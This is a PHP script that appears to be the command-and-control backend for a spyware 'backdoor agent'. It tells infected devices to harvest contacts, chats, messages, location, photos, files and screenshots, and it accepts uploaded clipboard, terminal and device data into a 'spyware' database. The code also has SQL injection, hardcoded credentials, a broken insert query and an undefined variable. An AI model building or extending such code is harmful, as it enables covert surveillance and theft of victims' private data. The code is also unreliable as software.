<?php

/** Parse url from backdoor agent and return configurations if asked **/

$url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

$parts = parse_url($url);
$query = $parts["query"];
parse_str($query, $query_params);
$parts = parse_url($url);

$task = $query_params["task"];
if (!empty($task)) {
	// Create a connection to DB
	$servername = "localhost";
	$username = "zeus";
	$password = "zeus";
	$dbname = "spyware";

	// Create connection
	$dbConnection = mysqli_connect($servername, $username, $password, $dbname);
	// Check connection
	if (!$dbConnection) {
		die("Connection failed: " . mysqli_connect_error());
	}

	if ($task == 'getConfigurations') {
		$social = [];
	
		if ($query_params['agent'] == 'zeus') {
			$social = array("addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1);
		}

		$data = array('screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1);

		header('Content-Type: application/json');
		echo json_encode($data);
	}
	else if ($task == 'setConfigurations') {
		$newConfigurations = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'clipboard') {
		$clipboardData = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'deviceInfo') {
		// Create table if not exists
		$query = "SELECT ID FROM DeviceID";
		$result = mysqli_query($dbConnection, $query);

		if(empty($result)) {
			$query = "CREATE TABLE `DeviceInfo` (ID int(11) AUTO_INCREMENT, `os` text NOT NULL, `cpuArchitecture` int NOT NULL, `installedApps` text NOT NULL, `memory` text NOT NULL, `time` text NOT NULL, `date` text NOT NULL, `deviceID` text NOT NULL, PRIMARY KEY (ID))";
			$result = mysqli_query($dbConnection, $query);
		}

		// Get base 64 encoded data & decode it
		if (!empty($query_params['data'])) {
			$deviceInfo = $query_params['data'];
			$decodedData = base64_decode($deviceInfo);
			$deviceInfo = json_decode($decodedData, true);

			$query = "INSERT INTO DeviceInfo ('os', 'cpuArchitecture', 'installedApps', 'memory', 'time', 'date', 'deviceID') VALUES ('" . $deviceInfo["os"] . "', " . $deviceInfo["cpuArchitecture"] . ", '" . $deviceInfo["installedApps"] . "', '" . $deviceInfo["memory"] . "', '" . $deviceInfo["time"] . "', '" . $deviceInfo["date"] . "', '" . $deviceInfo["deviceID"] . "'')";

			echo "query: " . $query . "\n";

			$queryResults = performSqlQuery($dbConnection, $sql);
			echo "queryResults: " . $queryResults;
		}
	}
	else if ($task == 'terminal') {
		$terminalOutput = $query_params['data'];
		// Save to DB
	}
	else if ($task == 'screenshot') {
		$base64Image = $query_params['data'];
		$base64Image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $base64Image));
		file_put_contents('/screenshots/image.png', $base64Image);
	}

	mysqli_close($dbConnection); // Close connection to DB
}

function walk($val, $key, &$new_array){
	$nums = explode('-',$val);
    $new_array[$nums[0]] = $nums[1];
}

function performSqlQuery($dbConnection, $sqlQuery) {
	if (mysqli_query($dbConnection, $sqlQuery)) {
		return "New record created successfully";
	}
	else {
		return "Error: " . $sqlQuery . "<br>" . mysqli_error($dbConnection);
	}
}

/* function buildSqlQueryFromDictionary($dataDictionary, $tableName) {
	$maxSize = count($dataDictionary);

	$query = "INSERT INTO " + $tableName + " (";
	for ($i=0; $i < maxSize; $i++) { 
		$key = $dataDictionary.key(array)
	}
} */

?>